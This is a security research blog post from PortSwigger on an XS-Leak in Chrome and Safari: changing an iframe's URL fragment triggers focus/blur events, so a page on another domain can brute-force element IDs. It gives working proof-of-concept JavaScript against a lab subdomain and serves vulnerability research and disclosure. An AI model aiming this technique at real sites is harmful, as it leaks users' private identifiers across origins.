# XS-Leak: Leaking IDs using focus

Source: https://portswigger.net/research/xs-leak-leaking-ids-using-focus
Fetched: 2026-06-28T09:17:32.482990+00:00

XS-Leak: Leaking IDs using focus

Gareth Heyes

Researcher

@garethheyes

Published: Tuesday, 8 October 2019 at 13:35 UTC

Updated: Wednesday, 9 October 2019 at 07:01 UTC

Whilst I was building the XSS cheatsheet I discovered some interesting behaviour in Chrome and Safari. For certain HTML elements, if you specify their ID in the URL fragment it will scroll to the element and fire a focus event. This can be triggered cross-domain using an iframe. I thought this could be abused to create an XS-Leak to bruteforce ids cross domain. I could load the target domain once and then modify the hash multiple times and because the hash isn't sent to the server you would only issue one request and the focus event will fire once a valid id is found. For example let's say we want to discover what id the following input element has on a site from a different domain.

<input id=1337>

We could load the URL containing the element, then when the onload event fires we could change the hash and if the  focus event fires we have found the correct id if not increment the value and check again.

Here's a breakdown of the proof of concept:

The window.onblur event is used to detect if the target element has focus.

<body onblur="if(!window.found){window.found=true;alert('Found: '+position_of_current_id)}">

A div element is used to show the current id position being checked so you can watch the attack in real time.

<div id=y></div>

The found flag will be set when the blur event is fired, indicating that we've got focus.

position_of_current_id = 1000;

found = false;

I create an iframe pointing to the target domain, and when the onload event is called we invoke the tryNextID function.

var iframe = document.createElement('iframe');

iframe.src='http://subdomain1.portswigger-labs.net/x-domain_leak_focus/test2.html';

document.body.appendChild(iframe);

iframe.onload = tryNextID;

The tryNextID function shows the current position, then changes the hash to the next potential ID. If the ID is not found then the candidate ID is incremented and a setTimeout is called after 50 milliseconds.

function tryNextID() {

if(!found){

document.getElementById('y').textContent = position_of_current_id;

iframe.src='http://subdomain1.portswigger-labs.net/x- domain_leak_focus/test2.html#'+position_of_current_id;

timer = setTimeout(function(){

if(!found && position_of_current_id < 2000) {

position_of_current_id++;

}

tryNextID();

},50);

}

}

Here is a proof of concept that works on Chrome or Safari.

XS-Leak focus proof of concept

XS-Leaks

JavaScript

HTML

Back to all articles

Related Research

Exploiting prototype pollution in Node without the filesystem

23 March 2023

Exploiting prototype pollution in Node without the filesystem

The seventh way to call a JavaScript function without parentheses

12 September 2022

The seventh way to call a JavaScript function without parentheses

Evading defences using VueJS script gadgets

12 October 2020

Evading defences using VueJS script gadgets

Redefining Impossible: XSS without arbitrary JavaScript

23 September 2020

Redefining Impossible: XSS without arbitrary JavaScript
